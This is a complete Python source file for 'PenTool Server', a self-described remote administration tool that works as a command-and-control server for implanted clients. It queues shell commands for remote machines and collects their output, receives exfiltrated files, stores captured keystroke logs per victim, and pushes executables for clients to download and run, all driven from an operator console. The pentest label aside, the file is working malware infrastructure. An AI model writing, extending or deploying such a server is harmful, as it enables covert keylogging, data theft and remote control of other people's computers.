import http.server
import socketserver
import threading
import json
import os
import time
from urllib.parse import urlparse, parse_qs
import argparse
import cgi
import io

# Color codes
PURPLE = '\033[95m'
RESET = '\033[0m'

class PenToolServer(http.server.BaseHTTPRequestHandler):
    clients = {}
    commands = {}
    outputs = {}
    keylogs = {}
    
    def log_message(self, format, *args):
        """Override to customize logging"""
        pass  # Suppress default logging, we'll do our own
    
    def update_client(self, client_id):
        """Update client's last seen time"""
        if client_id:
            self.clients[client_id] = time.time()
            print(f"Client {client_id} connected (last seen: {time.strftime('%Y-%m-%d %H:%M:%S')})")
    
    def do_GET(self):
        parsed_path = urlparse(self.path)
        path = parsed_path.path
        query = parse_qs(parsed_path.query)
        
        # Get client ID from header
        client_id = self.headers.get('X-Client-ID', '')
        self.update_client(client_id)
        
        if path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>PenTool Server</title>
                <style>
                    body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
                    .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                    h1 { color: #333; }
                    .info { background: #e3f2fd; padding: 15px; border-radius: 4px; margin: 20px 0; }
                    code { background: #f5f5f5; padding: 2px 6px; border-radius: 3px; font-family: monospace; }
                    ul { line-height: 1.8; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>🔧 PenTool Server</h1>
                    <div class="info">
                        <p><strong>Server Status:</strong> [ok] Running</p>
                        <p><strong>Port:</strong> 5000</p>
                        <p>Use the terminal interface to control connected clients.</p>
                    </div>
                    <h3>Available Commands:</h3>
                    <ul>
                        <li><code>list</code> - List all connected clients</li>
                        <li><code>select &lt;number&gt;</code> - Select a client</li>
                        <li><code>send &lt;command&gt;</code> - Send command to selected client</li>
                        <li><code>output</code> - View client output</li>
                        <li><code>keylog</code> - View client keylog</li>
                        <li><code>upload &lt;filename&gt;</code> - Upload file to selected client</li>
                    </ul>
                    <h3>File Management:</h3>
                    <ul>
                        <li>Place files in <code>uploads/</code> directory to send to clients</li>
                        <li>Received files are saved in <code>received_files/</code> directory</li>
                        <li>Keylogs are saved in <code>keylogs/</code> directory</li>
                    </ul>
                </div>
            </body>
            </html>
            """
            self.wfile.write(html.encode())
            return
        
        if path == '/command':
            if client_id in self.commands:
                command = self.commands[client_id]
                del self.commands[client_id]
                
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(command.encode())
            else:
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"NO_COMMAND")
            return
        
        if path == '/clients':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            client_list = [
                {
                    'id': cid,
                    'last_seen': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(ts))
                }
                for cid, ts in self.clients.items()
            ]
            self.wfile.write(json.dumps(client_list).encode())
            return
        
        # Serve uploaded files to clients
        if path.startswith('/uploads/'):
            filename = path[9:]  # Remove '/uploads/' prefix
            file_path = os.path.join('uploads', filename)
            
            if os.path.exists(file_path) and os.path.isfile(file_path):
                try:
                    file_size = os.path.getsize(file_path)
                    
                    print(f"\n{'='*60}")
                    print(f"[{client_id}] File download request")
                    print(f"{'='*60}")
                    print(f"File: {filename}")
                    print(f"Size: {file_size} bytes")
                    
                    # Determine content type
                    content_type = 'application/octet-stream'
                    if filename.endswith('.exe'):
                        content_type = 'application/octet-stream'
                    elif filename.endswith('.jpg') or filename.endswith('.jpeg'):
                        content_type = 'image/jpeg'
                    elif filename.endswith('.png'):
                        content_type = 'image/png'
                    elif filename.endswith('.pdf'):
                        content_type = 'application/pdf'
                    elif filename.endswith('.zip'):
                        content_type = 'application/zip'
                    elif filename.endswith('.txt'):
                        content_type = 'text/plain'
                    elif filename.endswith('.mp3'):
                        content_type = 'audio/mpeg'
                    elif filename.endswith('.mp4'):
                        content_type = 'video/mp4'
                    
                    print(f"Content-Type: {content_type}")
                    
                    self.send_response(200)
                    self.send_header('Content-type', content_type)
                    self.send_header('Content-Length', str(file_size))
                    self.send_header('Content-Disposition', f'attachment; filename="{filename}"')
                    self.end_headers()
                    
                    # Send file in chunks
                    with open(file_path, 'rb') as f:
                        chunk_size = 8192
                        bytes_sent = 0
                        while True:
                            chunk = f.read(chunk_size)
                            if not chunk:
                                break
                            self.wfile.write(chunk)
                            bytes_sent += len(chunk)
                    
                    print(f"✓ File sent successfully: {bytes_sent} bytes")
                    print(f"{'='*60}\n")
                    return
                    
                except Exception as e:
                    print(f"Error serving file: {e}")
                    import traceback
                    traceback.print_exc()
                    self.send_response(500)
                    self.send_header('Content-type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(f"Error: {str(e)}".encode())
                    return
            else:
                print(f"File not found: {file_path}")
                self.send_response(404)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"File not found")
                return
        
        self.send_response(404)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"Not Found")
    
    def do_POST(self):
        parsed_path = urlparse(self.path)
        path = parsed_path.path
        
        client_id = self.headers.get('X-Client-ID', '')
        
        # Update client last seen time
        self.update_client(client_id)
        
        # Handle output endpoint
        if path == '/output':
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length).decode('utf-8')
                
                data = parse_qs(post_data).get('data', [''])[0]
                self.outputs[client_id] = data
                
                print(f"\n{'='*60}")
                print(f"[{client_id}] Output received:")
                print(f"{'-'*60}")
                print(data)
                print(f"{'='*60}\n")
                
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"OK")
                
            except UnicodeDecodeError as e:
                print(f"ERROR: Binary data sent to /output endpoint")
                print(f"This endpoint expects text data only. Use /file for binary uploads.")
                self.send_response(400)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"ERROR: Binary data not allowed on /output endpoint")
            except Exception as e:
                print(f"Error processing output: {e}")
                import traceback
                traceback.print_exc()
                self.send_response(500)
                self.end_headers()
            return
        
        # Handle file upload endpoint
        if path == '/file':
            try:
                content_type = self.headers.get('Content-Type', '')
                content_length = self.headers.get('Content-Length', 'unknown')
                
                print(f"\n{'='*60}")
                print(f"[{client_id}] File upload request")
                print(f"{'-'*60}")
                print(f"Content-Type: {content_type}")
                print(f"Content-Length: {content_length} bytes")
                
                if 'multipart/form-data' in content_type:
                    # Parse multipart form data
                    form = cgi.FieldStorage(
                        fp=self.rfile,
                        headers=self.headers,
                        environ={
                            'REQUEST_METHOD': 'POST',
                            'CONTENT_TYPE': content_type,
                        }
                    )
                    
                    print(f"Form fields: {list(form.keys())}")
                    
                    if 'file' in form:
                        fileitem = form['file']
                        
                        if fileitem.filename:
                            # Read file data
                            file_data = fileitem.file.read()
                            
                            print(f"Received file: {fileitem.filename}")
                            print(f"File size: {len(file_data)} bytes")
                            
                            # Check if data is valid
                            if len(file_data) == 0:
                                print("ERROR: Received file is empty!")
                                self.send_response(400)
                                self.send_header('Content-type', 'text/plain')
                                self.end_headers()
                                self.wfile.write(b"ERROR: Empty file")
                                return
                            
                            # Check file signature
                            signature = file_data[:4]
                            if signature == b'\x89PNG':
                                print("✓ Valid PNG file detected")
                            elif signature[:2] == b'\xff\xd8':
                                print("✓ Valid JPEG file detected")
                            elif signature == b'RIFF':
                                print("✓ Valid WAV file detected")
                            else:
                                print(f"⚠ Unknown file type, signature: {signature.hex()}")
                            
                            # Create directory
                            os.makedirs("received_files", exist_ok=True)
                            
                            # Generate filename
                            timestamp = time.strftime("%Y%m%d_%H%M%S")
                            original_name = os.path.basename(fileitem.filename)
                            filename = f"{client_id}_{timestamp}_{original_name}"
                            save_path = os.path.join("received_files", filename)
                            
                            # Save file
                            with open(save_path, 'wb') as f:
                                bytes_written = f.write(file_data)
                            
                            print(f"Saved to: {save_path}")
                            print(f"Bytes written: {bytes_written}")
                            
                            # Verify save
                            if os.path.exists(save_path):
                                saved_size = os.path.getsize(save_path)
                                print(f"Verified size on disk: {saved_size} bytes")
                                
                                if saved_size == 0:
                                    print("[error] WARNING: Saved file is empty!")
                                    self.send_response(500)
                                    self.end_headers()
                                    return
                                elif saved_size != len(file_data):
                                    print(f"⚠ WARNING: Size mismatch! Expected {len(file_data)}, got {saved_size}")
                                else:
                                    print("✓ File saved successfully!")
                                
                                print(f"{'='*60}\n")
                                
                                self.send_response(200)
                                self.send_header('Content-type', 'text/plain')
                                self.end_headers()
                                self.wfile.write(b"OK")
                            else:
                                print("[error] ERROR: File was not saved!")
                                print(f"{'='*60}\n")
                                self.send_response(500)
                                self.end_headers()
                        else:
                            print("ERROR: No filename provided in upload")
                            print(f"{'='*60}\n")
                            self.send_response(400)
                            self.send_header('Content-type', 'text/plain')
                            self.end_headers()
                            self.wfile.write(b"ERROR: No filename")
                    else:
                        print("ERROR: 'file' field not found in form data")
                        print(f"Available fields: {list(form.keys())}")
                        print(f"{'='*60}\n")
                        self.send_response(400)
                        self.send_header('Content-type', 'text/plain')
                        self.end_headers()
                        self.wfile.write(b"ERROR: Missing 'file' field")
                else:
                    print(f"ERROR: Expected multipart/form-data, got {content_type}")
                    print(f"{'='*60}\n")
                    self.send_response(400)
                    self.send_header('Content-type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(b"ERROR: Expected multipart/form-data")
                    
            except Exception as e:
                print(f"ERROR: Exception while saving file: {e}")
                import traceback
                traceback.print_exc()
                print(f"{'='*60}\n")
                self.send_response(500)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(f"ERROR: {str(e)}".encode())
            return
        
        # Handle keylog endpoint
        if path == '/keylog':
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length).decode('utf-8')
                
                data = parse_qs(post_data).get('data', [''])[0]
                
                # Save to keylog file
                if client_id not in self.keylogs:
                    self.keylogs[client_id] = []
                
                self.keylogs[client_id].append(data)
                
                # Append to file
                os.makedirs("keylogs", exist_ok=True)
                keylog_file = os.path.join("keylogs", f"{client_id}.txt")
                with open(keylog_file, 'a', encoding='utf-8') as f:
                    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
                    f.write(f"[{timestamp}] {data}\n")
                
                print(f"[{client_id}] Keylog: {data}")
                
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"OK")
                
            except Exception as e:
                print(f"Error processing keylog: {e}")
                import traceback
                traceback.print_exc()
                self.send_response(500)
                self.end_headers()
            return
        
        # Unknown endpoint
        self.send_response(404)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"Not Found")

def run_server(port):
    """Run the HTTP server"""
    socketserver.TCPServer.allow_reuse_address = True
    
    try:
        with socketserver.TCPServer(("", port), PenToolServer) as httpd:
            print(f"\n{'='*60}")
            print(f"PenTool Server Started")
            print(f"{'='*60}")
            print(f"Port: {port}")
            print(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
            print(f"{'='*60}\n")
            httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n\nServer shutting down...")
    except Exception as e:
        print(f"Server error: {e}")
        import traceback
        traceback.print_exc()

def get_server_ip():
    """Get the server's local IP address"""
    import socket
    try:
        # Create a socket to get local IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "localhost"

def cli_interface():
    """Command-line interface for controlling clients"""
    print("\n" + "="*60)
    print("PenTool Server CLI")
    print("="*60)
    print("\nCommands:")
    print("  list                    - List connected clients with numbers")
    print("  select <number>         - Select a client by number")
    print("  send <number> <command> - Send command to client by number")
    print("  send <command>          - Send command to selected client")
    print("  output <number>         - Show last output from client by number")
    print("  output                  - Show last output from selected client")
    print("  keylog <number>         - Show keylog for client by number")
    print("  keylog                  - Show keylog for selected client")
    print("  upload <filename>       - Upload file to selected client")
    print("  files                   - List files in uploads directory")
    print("  current                 - Show currently selected client")
    print("  clear                   - Clear screen")
    print("  exit                    - Exit server")
    print("="*60 + "\n")
    
    current_client = None
    server_ip = get_server_ip()
    server_port = 5000  # Default port
    
    while True:
        try:
            # Show current client in prompt if one is selected
            if current_client:
                prompt = f"\n{PURPLE}[{current_client[:20]}...]{RESET}> " if len(current_client) > 20 else f"\n{PURPLE}[{current_client}]{RESET}> "
            else:
                prompt = "\n> "
            
            cmd = input(prompt).strip()
            
            if not cmd:
                continue
            
            if cmd == "exit":
                print("\nExiting...")
                break
            
            if cmd == "clear":
                os.system('clear' if os.name != 'nt' else 'cls')
                continue
            
            if cmd == "files":
                print("\n" + "="*60)
                print("Files in uploads directory")
                print("="*60)
                
                if os.path.exists('uploads'):
                    files = [f for f in os.listdir('uploads') if os.path.isfile(os.path.join('uploads', f))]
                    
                    if files:
                        for i, filename in enumerate(files):
                            file_path = os.path.join('uploads', filename)
                            file_size = os.path.getsize(file_path)
                            
                            # Format file size
                            if file_size < 1024:
                                size_str = f"{file_size} B"
                            elif file_size < 1024 * 1024:
                                size_str = f"{file_size / 1024:.2f} KB"
                            else:
                                size_str = f"{file_size / (1024 * 1024):.2f} MB"
                            
                            print(f"  [{i}] {filename} ({size_str})")
                    else:
                        print("  No files in uploads directory")
                        print("\n  To upload files to clients:")
                        print("  1. Place files in the 'uploads/' directory")
                        print("  2. Use: upload <filename>")
                else:
                    print("  uploads directory does not exist")
                
                print("="*60)
                continue
            
            if cmd == "list":
                print("\n" + "="*60)
                print("Connected Clients")
                print("="*60)
                client_list = list(PenToolServer.clients.keys())
                
                if not client_list:
                    print("No clients connected")
                else:
                    for i, client_id in enumerate(client_list):
                        last_seen = PenToolServer.clients[client_id]
                        last_seen_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(last_seen))
                        
                        # Calculate time since last seen
                        time_diff = time.time() - last_seen
                        if time_diff < 60:
                            status = f"[green] Active ({int(time_diff)}s ago)"
                        elif time_diff < 300:
                            status = f"[yellow] Idle ({int(time_diff/60)}m ago)"
                        else:
                            status = f"[red] Inactive ({int(time_diff/60)}m ago)"
                        
                        print(f"  [{i}] {client_id}")
                        print(f"      Last seen: {last_seen_str} - {status}")
                
                print("="*60)
                continue
            
            if cmd == "current":
                if current_client:
                    print(f"\nCurrently selected client: {current_client}")
                else:
                    print("\nNo client currently selected")
                continue
            
            # Split command into parts
            parts = cmd.split(maxsplit=1)
            if not parts:
                continue
            
            action = parts[0]
            
            if action == "select":
                if len(parts) < 2:
                    print("Usage: select <number>")
                    continue
                
                try:
                    client_index = int(parts[1])
                    client_list = list(PenToolServer.clients.keys())
                    
                    if client_index < 0 or client_index >= len(client_list):
                        print(f"Invalid client number. Use 0 to {len(client_list)-1}")
                        continue
                    
                    current_client = client_list[client_index]
                    print(f"✓ Selected client: {current_client}")
                    
                except ValueError:
                    print("Error: Client number must be an integer")
                continue
            
            # Handle send command
            if action == "send":
                if len(parts) < 2:
                    print("Usage: send <number> <command> OR send <command>")
                    continue
                
                args = parts[1].split(maxsplit=1)
                
                # Check if first argument is a number
                try:
                    client_index = int(args[0])
                    client_list = list(PenToolServer.clients.keys())
                    
                    if client_index < 0 or client_index >= len(client_list):
                        print(f"Invalid client number. Use 0 to {len(client_list)-1}")
                        continue
                    
                    if len(args) < 2:
                        print("Usage: send <number> <command>")
                        continue
                    
                    client_id = client_list[client_index]
                    command = args[1]
                    
                except (ValueError, IndexError):
                    # Not a number, treat entire args as command
                    if not current_client:
                        print("No client selected. Use 'select <number>' first")
                        continue
                    
                    client_id = current_client
                    command = parts[1]
                
                PenToolServer.commands[client_id] = command
                print(f"✓ Command sent to {client_id}: {command}")
                continue
            
            # Handle upload command
            if action == "upload":
                if len(parts) < 2:
                    print("Usage: upload <filename>")
                    continue
                
                if not current_client:
                    print("No client selected. Use 'select <number>' first")
                    continue
                
                filename = parts[1]
                upload_path = os.path.join('uploads', filename)
                
                if not os.path.exists(upload_path):
                    print(f"Error: File not found: {upload_path}")
                    print(f"Place files in the 'uploads/' directory first")
                    print(f"Use 'files' command to list available files")
                    continue
                
                file_size = os.path.getsize(upload_path)
                
                # Format file size
                if file_size < 1024:
                    size_str = f"{file_size} B"
                elif file_size < 1024 * 1024:
                    size_str = f"{file_size / 1024:.2f} KB"
                else:
                    size_str = f"{file_size / (1024 * 1024):.2f} MB"
                
                print(f"\n{'='*60}")
                print(f"Uploading file to client")
                print(f"{'='*60}")
                print(f"Client: {current_client}")
                print(f"File: {filename}")
                print(f"Size: {size_str}")
                print(f"{'='*60}\n")
                
                # Construct download URL
                server_url = f"http://{server_ip}:{server_port}/uploads/{filename}"
                
                # Send download command to client
                command = f"download {server_url} {filename}"
                PenToolServer.commands[current_client] = command
                
                print(f"✓ Upload command sent to {current_client}")
                print(f"Client will download from: {server_url}")
                continue
            
            # Handle output command
            if action == "output":
                if len(parts) > 1:
                    try:
                        client_index = int(parts[1])
                        client_list = list(PenToolServer.clients.keys())
                        
                        if client_index < 0 or client_index >= len(client_list):
                            print(f"Invalid client number. Use 0 to {len(client_list)-1}")
                            continue
                        
                        client_id = client_list[client_index]
                    except ValueError:
                        print("Error: Client number must be an integer")
                        continue
                else:
                    if not current_client:
                        print("No client selected. Use 'select <number>' first")
                        continue
                    client_id = current_client
                
                if client_id in PenToolServer.outputs:
                    print("\n" + "="*60)
                    print(f"Output from {client_id}")
                    print("="*60)
                    print(PenToolServer.outputs[client_id])
                    print("="*60)
                else:
                    print(f"No output received from {client_id}")
                continue
            
            # Handle keylog command
            if action == "keylog":
                if len(parts) > 1:
                    try:
                        client_index = int(parts[1])
                        client_list = list(PenToolServer.clients.keys())
                        
                        if client_index < 0 or client_index >= len(client_list):
                            print(f"Invalid client number. Use 0 to {len(client_list)-1}")
                            continue
                        
                        client_id = client_list[client_index]
                    except ValueError:
                        print("Error: Client number must be an integer")
                        continue
                else:
                    if not current_client:
                        print("No client selected. Use 'select <number>' first")
                        continue
                    client_id = current_client
                
                keylog_file = os.path.join("keylogs", f"{client_id}.txt")
                
                if os.path.exists(keylog_file):
                    print("\n" + "="*60)
                    print(f"Keylog for {client_id}")
                    print("="*60)
                    with open(keylog_file, 'r', encoding='utf-8') as f:
                        content = f.read()
                        if content:
                            print(content)
                        else:
                            print("(empty)")
                    print("="*60)
                else:
                    print(f"No keylog file for {client_id}")
                continue
            
            print(f"Unknown command: {cmd}")
            print("Type one of the available commands or 'exit' to quit")
        
        except KeyboardInterrupt:
            print("\n\nExiting...")
            break
        except EOFError:
            print("\n\nExiting...")
            break
        except Exception as e:
            print(f"Error: {e}")
            import traceback
            traceback.print_exc()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='PenTool Server - Remote Administration Tool')
    parser.add_argument('--port', type=int, default=5000, help='Port to run server on (default: 5000)')
    args = parser.parse_args()
    
    # Create necessary directories
    os.makedirs("received_files", exist_ok=True)
    os.makedirs("keylogs", exist_ok=True)
    os.makedirs("uploads", exist_ok=True)
    
    print("\n" + "="*60)
    print("Initializing PenTool Server...")
    print("="*60)
    print(f"Server IP: {get_server_ip()}")
    print(f"Server Port: {args.port}")
    print("\nDirectory Structure:")
    print(f"  [folder] received_files/  - Files received from clients")
    print(f"  [folder] keylogs/         - Keystroke logs from clients")
    print(f"  [folder] uploads/         - Files to send to clients")
    print("="*60)
    
    # Start server in a separate thread
    server_thread = threading.Thread(target=run_server, args=(args.port,), daemon=True)
    server_thread.start()
    
    # Give server time to start
    time.sleep(1)
    
    # Start CLI interface (runs in main thread)
    try:
        cli_interface()
    except KeyboardInterrupt:
        print("\n\nShutting down server...")
    
    print("Goodbye!\n")
